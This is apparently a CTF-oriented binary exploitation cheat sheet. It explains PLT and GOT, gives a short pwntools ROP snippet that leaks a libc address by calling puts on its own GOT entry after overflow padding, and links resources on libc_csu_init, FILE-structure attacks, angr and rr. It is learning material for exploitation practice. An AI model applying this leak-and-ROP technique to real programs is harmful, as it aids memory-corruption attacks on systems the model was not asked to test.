### **Puts Puts**
**Create Libc Leaks**

PLT - Procedure Linkage Table

- If the address of the external resource (eg puts) is known, jumps to it.

- If the address of the external resource is *not* known, look it up

- Accessible in pwntools via 

  ```python
  elf.plt['function_name']
  ```


GOT - Global Offset Table

- Contains pointers to external resources
- Accessible in pwntools via
```python
  elf.got['function_name']
  ```
  
Example pwntools script to find leak:

```python
from pwn import *

# tell pwntools about your system so it knows calling convention, etc.
context(arch='x86', os='linux', endian='little', terminal=['tmux', 'splitw', '-h'])

# create objects to help us parse the elf and create ROP chains
elf = ELF('path/to/binary')
rop = ROP(elf)

# get a ROP gadget to call puts with a pointer to an address in libc as an address
rop.puts(elf.got['puts'])
p.sendline('A'*24+str(rop))
```
[More Detailed Look at PLT/GOT for Pwning Purposes](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)

[Example Writeup Using Puts Puts with Pwntools](http://ctfhacker.com/ctf/pwnable/2015/08/18/campctf-bitterman.html)


### **Libc_csu_init**
**Call Arbitrary Functions With up to Three Arguments**

![](https://github.com/RylanOC/BLACK-MAGIC/blob/master/media/libc_csu_init.jpeg)


### **STDIN Buffer**
[https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique](https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique)

[https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf](https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf)

## **Symbolic Execution**
[https://github.com/jakespringer/angr_ctf](https://github.com/jakespringer/angr_ctf)

## **Timeless Debugging** 
[https://rr-project.org/](https://rr-project.org/)
